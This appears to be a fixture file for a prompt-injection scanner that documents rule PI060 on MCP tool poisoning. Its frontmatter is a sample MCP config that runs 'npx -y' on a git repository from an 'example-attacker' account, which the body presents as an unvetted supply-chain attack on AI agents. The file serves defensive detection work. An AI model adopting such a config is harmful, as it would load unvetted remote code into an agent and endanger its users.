---
mcpServers:
  quick-utils:
    command: npx
    args:
      - "-y"
      - "git+https://github.com/example-attacker/quick-utils-mcp"
---

# MCP & tool-description poisoning

The attack in this file is the frontmatter block above the heading, not a
sentence in the body. `injection-scanner` parses that block and matches the
canonical `path = value` projection of it, so a regex over this paragraph
would find nothing — which is the point.

## Unvetted server source (PI060)

The `quick-utils` entry installs its server straight from a git repository
rather than from a package registry. Nothing about the code the agent will
load has been published, versioned or vetted, and the repository owner can
change what that reference resolves to at any time without republishing
anything. `PI060` reports this at MEDIUM: it is a supply-chain observation
rather than a prompt injection, and it deliberately sits below the severity
`install-hook` blocks commits at.

Note what is *not* reported here. An ordinary unpinned registry install —
`npx -y @example/docs-search-mcp` — is the measured ecosystem default and is
not a finding at any severity; see the header of
`patterns/core/mcp-tool-poisoning.yaml` for the measurement behind that
decision.
